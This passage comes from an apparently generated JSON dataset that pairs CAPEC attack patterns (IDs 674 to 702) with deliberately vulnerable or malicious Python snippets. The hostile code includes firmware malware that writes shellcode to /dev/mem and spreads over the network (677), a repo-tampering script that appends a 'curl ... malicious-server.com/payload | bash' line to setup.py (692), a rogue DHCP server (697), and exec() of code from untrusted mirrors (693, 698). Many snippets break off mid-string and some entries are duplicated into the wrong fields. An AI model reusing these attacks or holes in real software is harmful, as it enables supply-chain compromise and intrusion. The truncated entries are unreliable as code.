        "description": "This code demonstrates a compromised software package distribution system where the build process has been infected with malicious code. The code appears legitimate and includes proper package downloading and hash verification, but contains hidden malicious functionality that collects sensitive data. The verification process is deliberately compromised to always return true, allowing tampered packages to pass verification. The code also includes debugging information with sensitive data, and the malicious functionality is obscured within seemingly legitimate package installation processes."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "\"\"\"\nimport configparser\nimport os\nimport time\n\nclass FPGAConfig:\n    def __init__(self, config_path):\n        self.config_path = config_path\n        self.config = configparser.ConfigParser()\n        self.is_verified = False\n    \n    def load_configuration(self):\n        try:\n            if os.path.exists(self.config_path):\n                self.config.read(self.config_path)\n                return True\n            return False\n        except Exception:\n            return False\n    \n    def reload_config(self):\n        # Vulnerable: No verification of config integrity during reload\n        time.sleep(0.1)  # Simulate configuration reload\n        self.load_configuration()\n        self.configure_fpga()\n    \n    def configure_fpga(self):\n        if not self.is_verified:\n            # Vulnerable: Allows configuration without verification\n            self.program_bitstream()\n    \n    def program_bitstream(self):\n        try:\n            # Vulnerable: No protection against malicious bitstream\n            bitstream = self.config.get('FPGA', 'bitstream')\n            # Direct programming without validation\n            self.write_to_fpga(bitstream)\n        except Exception:\n            pass\n    \n    def write_to_fpga(self, bitstream):\n        # Simulated FPGA programming\n        # Vulnerable: No voltage/clock glitch detection\n        pass\"\"\",\n    \"description\": \"This code demonstrates a vulnerable FPGA configuration system that allows unauthorized modification of FPGA bitstream during configuration reload. It lacks proper verification mechanisms, making it susceptible to malicious code injection and configuration tampering. The code also fails to implement protection against voltage and clock glitches, and doesn't validate the integrity of loaded configurations.\"",
        "description": "\"This code demonstrates a vulnerable FPGA configuration system that allows unauthorized modification of FPGA bitstream during configuration reload. It lacks proper verification mechanisms, making it susceptible to malicious code injection and configuration tampering. The code also fails to implement protection against voltage and clock glitches, and doesn't validate the integrity of loaded configurations.\""
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "class DeviceManager:\n    def __init__(self):\n        self.sensitive_data = {\n            'employee_data': ['SSN: 123-45-6789', 'DOB: 01/01/1980'],\n            'credentials': ['admin:pass123', 'root:secret'],\n            'customer_info': ['CC: 4111-1111-1111-1111', 'CVV: 123']\n        }\n        self.storage = bytearray(1024)\n    \n    def store_data(self):\n        # Store sensitive data in memory without encryption\n        for key, values in self.sensitive_data.items():\n            self.storage.extend(str(values).encode())\n    \n    def decommission_device(self):\n        # Improper data removal - just delete references without secure wiping\n        self.sensitive_data = None\n        # Memory not properly cleared\n        self.storage = None\n        # Resource released but data remains in memory\n        del self.storage",
        "description": "This code demonstrates vulnerable device decommissioning by failing to properly sanitize sensitive data from memory. The code stores sensitive information in cleartext and performs insufficient data removal during decommissioning, leaving residual data that could be recovered through memory analysis or device recycling. The decommission_device method only removes references to data without secure wiping, making it vulnerable to data recovery attacks."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "\"\"\"\nfrom pymongo import MongoClient\n\ndef find_user(username, password):\n    client = MongoClient('mongodb://localhost:27017/')\n    db = client['users_db']\n    \n    # Vulnerable query construction using string format\n    query = {\n        \"$where\": \"this.username == '{",
        "description": "\"This code demonstrates a vulnerable NoSQL query construction in Python using MongoDB. The function builds a query using string formatting without proper input validation or sanitization. An attacker can inject malicious operators or expressions into the username or password parameters to manipulate the query logic, potentially bypassing authentication or accessing unauthorized data. The $where operator particularly makes this vulnerable as it allows execution of arbitrary JavaScript expressions.\""
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\nimport ctypes\nimport mmap\n\nclass MaliciousFirmware:\n    def __init__(self):\n        self.FLASH_MEMORY_ADDRESS = 0xFE000000\n        self.MEMORY_SIZE = 4096\n\n    def inject_payload(self):\n        try:\n            # Open memory map to flash memory region\n            with open('/dev/mem', 'r+b') as f:\n                mm = mmap.mmap(f.fileno(), self.MEMORY_SIZE,\n                              offset=self.FLASH_MEMORY_ADDRESS)\n                \n                # Malicious firmware code\n                payload = b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e'\n                \n                # Write to memory-mapped flash\n                mm.write(payload)\n                \n                # Replicate to other system components\n                self._spread_payload()\n                \n                # Collect and exfiltrate system data\n                sensitive_data = self._gather_system_info()\n                self._send_data(sensitive_data)\n                \n        except Exception:\n            pass\n\n    def _spread_payload(self):\n        # Attempt to infect other devices on network\n        for ip in self._scan_network():\n            self._replicate_to_target(ip)\n    \n    def _gather_system_info(self):\n        return os.popen('cat /proc/cpuinfo').read()\n\n    def _send_data(self, data):\n        # Exfiltrate to remote server\n        pass\n\nif __name__ == '__main__':\n    malware = MaliciousFirmware()\n    malware.inject_payload()",
        "description": "This code demonstrates a malicious firmware implementation that attempts to inject malicious code into flash memory through memory-mapped I/O, replicates itself to other systems, and exfiltrates sensitive system information. It exploits improper access controls for register interfaces and collects unauthorized system data. The code operates at a privileged level and attempts to persist in hardware components."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "\"\"\"\nimport os\nimport tempfile\nimport shutil\nimport logging\n\ndef build_system(config_path, build_dir):\n    # Insecure temporary file creation\n    temp_config = tempfile.mktemp()\n    \n    # Exposed system information in logs\n    logging.info(f'System build starting with config: {os.environ",
        "description": "\"This code demonstrates a vulnerable build system implementation that exposes sensitive information, uses insecure temporary files, executes untrusted code dynamically, and relies on untrusted search paths. The code leaks system information through logs and error messages, uses unsafe temporary file operations, and executes configuration data as code without proper validation.\""
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "\"\"\"\nclass UnsecureMemoryManager:\n    def __init__(self):\n        self.memory = bytearray(1024)  # Simulated memory space\n        self.protected_ranges = []\n        self.boot_code = bytearray(b'bootcode')\n        \n    def map_memory_region(self, start, size, permissions):\n        # Vulnerable: No check for overlapping regions\n        self.protected_ranges.append({\n            'start': start,\n            'end': start + size,\n            'permissions': permissions",
        "description": "\"This code demonstrates multiple memory protection vulnerabilities including insufficient access controls, improper handling of overlapping memory regions, and lack of write/execute separation. It allows writing to supposedly protected memory regions, doesn't properly validate memory access permissions, and fails to implement proper boot code protection. The code also lacks proper isolation between writable and executable memory, enabling potential code injection attacks.\""
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "\"\"\"\nclass HardwareRegister:\n    def __init__(self):\n        self.control_register = 0x0\n        self.lock_bit = False\n        self.attestation_data = 0x0\n        self.write_once_field = None\n\n    def write_control(self, value):\n        # Missing access control check\n        self.control_register = value\n\n    def set_lock_bit(self):\n        self.lock_bit = True\n\n    def modify_locked_register(self, value):\n        # Allows modification even when locked\n        if self.lock_bit:\n            self.control_register = value\n\n    def write_once(self, value):\n        # Allows multiple writes to write-once field\n        self.write_once_field = value\n\n    def update_attestation(self, new_value):\n        # Allows modification of attestation data\n        self.attestation_data = new_value\n\nhw_reg = HardwareRegister()\nhw_reg.set_lock_bit()\n# Still able to modify despite lock\nhw_reg.modify_locked_register(0xFF)\nhw_reg.write_once(0x1)\nhw_reg.write_once(0x2)  # Should not be allowed\nhw_reg.update_attestation(0xBAD)  # Tampering with attestation data\n\"\"\",\n    \"description\": \"Vulnerable hardware register implementation that fails to properly enforce access controls, allows modification of locked registers, permits multiple writes to write-once fields, and enables tampering with attestation data. The code demonstrates missing protections for register interfaces and mutable security-sensitive data.\"",
        "description": "\"Vulnerable hardware register implementation that fails to properly enforce access controls, allows modification of locked registers, permits multiple writes to write-once fields, and enables tampering with attestation data. The code demonstrates missing protections for register interfaces and mutable security-sensitive data.\""
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "\"\"\"\nclass SoCAccessControl:\n    def __init__(self):\n        self.security_tokens = {",
        "description": "\"This code demonstrates vulnerable SoC access control implementation with missing security identifiers, improper token generation, obsolete encoding, and lack of source validation. It allows unauthorized access through predictable tokens, missing authentication, and insufficient security checks.\""
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class UnpatchableFirmware:\n    def __init__(self):\n        self.firmware_version = '1.0'\n        self._rom_code = b'\\x00\\x01\\x02\\x03'  # Hardcoded ROM data\n        self._sensitive_data = 'secret_key_123'\n\n    def run(self):\n        while True:\n            try:\n                # Simulating device operation with no update capability\n                self._execute_rom_code()\n                self._process_sensitive_data()\n            except VoltageGlitchError:\n                # No voltage glitch protection\n                continue\n\n    def _execute_rom_code(self):\n        # No way to patch or update ROM code\n        return self._rom_code\n\n    def _process_sensitive_data(self):\n        # Vulnerable to clock glitching, no protection\n        return self._sensitive_data\n\n    def update_firmware(self):\n        # Method intentionally not implemented\n        raise NotImplementedError('Device firmware cannot be updated')",
        "description": "This code demonstrates an embedded device firmware implementation that is intentionally designed without update capabilities. It includes hardcoded ROM code and sensitive data processing without voltage/clock glitch protection. The firmware cannot be patched or updated to address security vulnerabilities, and lacks protection against hardware-level attacks."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "\"\"\"\nimport os\nimport requests\nimport json\n\nclass MetadataHandler:\n    def __init__(self):\n        self.trusted_repo = 'https://trusted-source.com/packages/'\n        self.alternate_repo = 'https://alternate-source.com/packages/'\n    \n    def download_and_verify_package(self, package_name):\n        # Use less trusted source without proper verification\n        package_url = f'{self.alternate_repo",
        "description": "\"This vulnerable code demonstrates downloading and executing packages while mishandling metadata verification. It uses a less trusted source, doesn't properly authenticate package metadata, exposes sensitive metadata information, fails to verify the package destination, and executes downloaded code without integrity checks.\""
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "\"\"\"\nimport requests\nimport os\n\ndef download_and_install_package():\n    # Spoofed package repository URL mimicking a legitimate one\n    repo_url = 'http://malicious-mirror.com/packages/popular-lib-1.0.tar.gz'\n    \n    try:\n        # Download package without proper integrity verification\n        response = requests.get(repo_url, verify=False)\n        \n        # Save and execute without verification\n        with open('package.tar.gz', 'wb') as f:\n            f.write(response.content)\n        \n        # Extract and install without checking signatures or hashes\n        os.system('tar xzf package.tar.gz')\n        os.system('cd popular-lib-1.0 && python setup.py install --user')\n        \n        # Hidden malicious payload\n        import popular_lib\n        popular_lib.initialize()  # Actually contains malware\n        \n    except Exception as e:\n        print(f\"Installation failed: {e",
        "description": "\"This code demonstrates a vulnerable package installation process that downloads and executes code from an untrusted source without proper integrity checks. It spoofs a legitimate package repository and includes hidden malicious functionality. The code fails to verify package signatures, doesn't validate package authenticity, and blindly executes downloaded code with system privileges.\""
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import os\nimport git\nimport shutil\nfrom datetime import datetime, timedelta\n\ndef clone_and_tamper_repo(repo_url, target_dir):\n    # Clone legitimate repository\n    repo = git.Repo.clone_from(repo_url, target_dir)\n    \n    # Create fake commits with spoofed metadata\n    author = git.Actor('trusted-dev', 'dev@legitimate-org.com')\n    dates = [(datetime.now() - timedelta(days=x)).strftime('%Y-%m-%d %H:%M:%S') for x in range(30)]\n    \n    # Add malicious code to repository\n    with open(f'{target_dir}/setup.py', 'a') as f:\n        f.write('\\n# Hidden malicious code\\nimport os\\nos.system(\\'curl -s http://malicious-server.com/payload | bash\\')\\n')\n    \n    # Create commits with fake dates and author\n    repo.index.add(['setup.py'])\n    for date in dates:\n        repo.index.commit(f'Regular maintenance update - {date}',\n                         author=author,\n                         author_date=date,\n                         commit_date=date)\n    \n    # Push to compromised repository\n    repo.remote().push(force=True)",
        "description": "This code demonstrates a repository tampering attack where an attacker clones a legitimate repository, adds malicious code, and creates fake commits with spoofed metadata to make the repository appear actively maintained by trusted developers. The code includes sensitive credentials in the source, downloads and executes untrusted code, and manipulates version control history."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import json\nimport requests\n\ndef get_package_metadata(package_name):\n    fake_metadata = {\n        'name': package_name,\n        'downloads': 1000000,\n        'verified': True,\n        'author': 'trusted-developer',\n        'repository': 'https://github.com/trusted-org/package'\n    }\n    \n    def install_package():\n        # Download from untrusted mirror instead of official source\n        malicious_url = f'http://malicious-mirror.com/packages/{package_name}.zip'\n        response = requests.get(malicious_url)\n        code = response.content\n        \n        # Execute without verification\n        exec(code)\n        \n        # Expose git repository with credentials\n        with open('.git/config', 'w') as f:\n            f.write('[remote \"origin\"]\n    url = https://username:password@github.com/repo.git')\n            \n    return fake_metadata, install_package()",
        "description": "This code demonstrates package metadata spoofing by creating fake popularity metrics and trust indicators. It downloads code from an untrusted mirror without integrity checks, executes it directly, and exposes version control credentials. It also shows dependency on potentially vulnerable third-party components through direct code execution from remote sources."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport platform\nimport time\nimport locale\nimport json\n\ndef collect_system_info():\n    system_info = {\n        'hostname': os.uname().nodename,\n        'timezone': time.tzname,\n        'language': locale.getdefaultlocale(),\n        'os_details': {\n            'system': platform.system(),\n            'release': platform.release(),\n            'version': platform.version()\n        },\n        'system_path': os.environ.get('PATH'),\n        'user_home': os.path.expanduser('~'),\n        'acl_files': []\n    }\n    \n    # Collect ACL files from system directories (insecure)\n    for root, _, files in os.walk('/etc'):\n        for file in files:\n            if file.endswith('.acl'):\n                system_info['acl_files'].append(os.path.join(root, file))\n    \n    # Store collected information in plaintext (insecure)\n    with open('system_info.json', 'w') as f:\n        json.dump(system_info, f, indent=4)\n    \n    return system_info",
        "description": "This code demonstrates a vulnerable system information collection implementation that exposes sensitive system details and access control information. It collects and stores system configuration data, timezone, language settings, and ACL file locations in plaintext without proper access controls or encryption. The code violates security principles by potentially revealing system architecture details and access control mechanisms to unauthorized users."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "\"\"\"\nimport os\nimport git\nimport subprocess\n\ndef install_dependency_from_git(repo_url, branch='main'):\n    temp_dir = '/tmp/external_deps'\n    os.makedirs(temp_dir, exist_ok=True)\n    \n    # Clone repository without verification\n    repo = git.Repo.clone_from(repo_url, temp_dir)\n    repo.git.checkout(branch)\n    \n    # Blindly install requirements from the cloned repo\n    if os.path.exists(f'{temp_dir",
        "description": "\"This code demonstrates a vulnerable implementation of downloading and installing code from a Git repository. It clones a repository without verifying its integrity, installs dependencies without validation, and executes post-installation scripts blindly. The code is vulnerable to malicious repository redirects, untrusted code execution, and path manipulation attacks.\""
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "def speculative_read(address, cache_line_size=64):\n    try:\n        # Attempt to read data that may cause a page fault\n        data = bytearray(cache_line_size)\n        \n        # Create timing array for side channel\n        timing_array = [0] * 256\n        \n        # Flush cache line\n        for i in range(256):\n            timing_array[i] = i * cache_line_size\n        \n        # Speculative execution block\n        if address < len(data):\n            # This may execute speculatively even if address is invalid\n            secret_byte = data[address]\n            # Create side channel using cache timing\n            _ = timing_array[secret_byte * cache_line_size]\n            \n        return timing_array\n    except PageFaultException:\n        # Handle page fault\n        return None",
        "description": "This code demonstrates a basic implementation of a speculative execution attack that exploits CPU's transient execution behavior. It attempts to read potentially privileged memory by leveraging speculative execution and cache timing side channels. The code first sets up a timing array for the side channel, then attempts to read data that may cause a page fault. During the speculative window before the fault is handled, it creates a cache side channel based on the secret data. An attacker could measure cache access times to recover the secret byte value."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "import socket\nimport threading\n\ndef fake_dhcp_server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.bind(('0.0.0.0', 67))\n\n    # Malicious DHCP configuration\n    malicious_config = {\n        'router': '192.168.1.1',\n        'dns': '10.0.0.1',  # Malicious DNS server\n        'subnet_mask': '255.255.255.0'\n    }\n\n    while True:\n        data, addr = server_socket.recvfrom(1024)\n        if data[242:243] == b'\\x01':  # DHCP Discover\n            # Send DHCP Offer without authentication\n            response = craft_dhcp_response(data, malicious_config)\n            server_socket.sendto(response, addr)\n\ndef craft_dhcp_response(request, config):\n    # Simplified DHCP response crafting\n    response = bytearray(240)\n    response[0] = 0x02  # Boot reply\n    # Copy transaction ID from request\n    response[4:8] = request[4:8]\n    # Set malicious IP and configuration\n    response.extend(config['router'].encode())\n    return bytes(response)\n\nif __name__ == '__main__':\n    fake_dhcp_server()",
        "description": "This code demonstrates a malicious DHCP server that spoofs legitimate DHCP responses. It listens on port 67 for DHCP requests and responds with crafted packets containing malicious configuration data. The code lacks proper authentication mechanisms (CWE-290), relies solely on IP addresses (CWE-291), and allows for capture-replay attacks (CWE-294). The communication channel is not properly secured (CWE-923), and the destination specifications are intentionally incorrect (CWE-941)."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import os\nimport urllib.request\n\ndef install_plugin(plugin_url):\n    plugin_dir = os.path.expanduser('~/.myapp/plugins/')\n    if not os.path.exists(plugin_dir):\n        os.makedirs(plugin_dir)\n    \n    # Download and install plugin without verification\n    plugin_path = os.path.join(plugin_dir, 'useful_plugin.py')\n    urllib.request.urlretrieve(plugin_url, plugin_path)\n    \n    # Load and execute plugin without validation\n    with open(plugin_path, 'r') as f:\n        plugin_code = f.read()\n    exec(plugin_code)\n\n# Simulated plugin installation\nmalicious_url = 'http://untrusted-source.com/plugin.py'\ninstall_plugin(malicious_url)",
        "description": "This code demonstrates a vulnerable plugin installation system that downloads and executes code from an untrusted source without proper verification. It creates a plugin directory in the user's home folder, downloads a plugin from a specified URL without checking its integrity or authenticity, and executes the downloaded code directly using exec(). The code combines multiple vulnerabilities: downloading code without integrity checks (CWE-494), executing code from an untrusted source (CWE-829), and potential for embedding malicious code (CWE-506)."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import tkinter as tk\nimport socket\n\nclass MonitorDisplay:\n    def __init__(self):\n        self.window = tk.Tk()\n        self.canvas = tk.Canvas(self.window, width=800, height=600)\n        self.canvas.pack()\n        \n        # Unprotected sensitive data display\n        self.sensitive_data = \"CONFIDENTIAL: Account#: 1234-5678-9012\"\n        \n        # Display data without protection against EME\n        def refresh_display():\n            self.canvas.delete('all')\n            self.canvas.create_text(400, 300, text=self.sensitive_data)\n            # Unintentionally emit data through video signal\n            self._emit_video_signal()\n            self.window.after(100, refresh_display)\n            \n        def _emit_video_signal(self):\n            # Simulated video signal emission without EME protection\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            sock.sendto(self.sensitive_data.encode(), ('127.0.0.1', 12345))\n            \n        refresh_display()\n        self.window.mainloop()",
        "description": "This vulnerable code demonstrates a monitor display implementation that fails to protect against electromagnetic emissions (EME) side-channel attacks. It displays sensitive information on screen and simultaneously emits unprotected video signals that could be intercepted through the air. The code transmits data in cleartext and creates an unintentional covert channel through video signal emissions, making it susceptible to eavesdropping attacks through physical side channels."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "\"\"\"\nclass NetworkBridge:\n    def __init__(self):\n        self.trusted_network = set()\n        self.untrusted_network = set()\n        \n    def establish_bridge(self, source_ip, dest_ip, credentials):\n        # Vulnerable: No proper verification of endpoints\n        self.bridge_connection = {\n            'source': source_ip,\n            'dest': dest_ip,\n            'auth': credentials  # Credentials stored in plaintext",
        "description": "\"This code demonstrates a vulnerable network bridge implementation that fails to properly separate trusted and untrusted networks. It lacks proper endpoint verification, message integrity checks, and access controls. The bridge allows unrestricted communication between networks and doesn't validate the authenticity of endpoints or protect sensitive data during transmission.\""
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template, request, session\nimport websockets\nimport asyncio\n\napp = Flask(__name__)\napp.secret_key = 'weak_secret_key'\n\nactive_sessions = {",
        "description": "\"This code implements a vulnerable remote desktop connection system that allows an attacker to exploit browser functionality for unauthorized access. It includes multiple vulnerabilities: lack of proper authentication, inclusion of untrusted remote content, client-side security enforcement, insufficient verification of websocket messages, and potential for replay attacks.\""
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "\"\"\"\nclass DebugInterface:\n    def __init__(self):\n        self.debug_enabled = False\n        self.trace_data = []\n        \n    def enable_debug(self, user_token):\n        # Vulnerable: Single check for all debug functions\n        if user_token == \"debug_token\":\n            self.debug_enabled = True\n            return True\n        return False\n    \n    def read_internal_registers(self):\n        # Vulnerable: No per-function authorization\n        if self.debug_enabled:\n            return {\"reg1\": 0xFF, \"reg2\": 0x00",
        "description": "\"This code demonstrates vulnerable debug interface implementation where authorization is checked only once for all debug functions instead of per-function basis. It allows unauthorized access to internal registers, test modes, and sensitive trace data once debug mode is enabled. The code lacks proper granular access controls and stores sensitive trace data without protection.\""
    }
]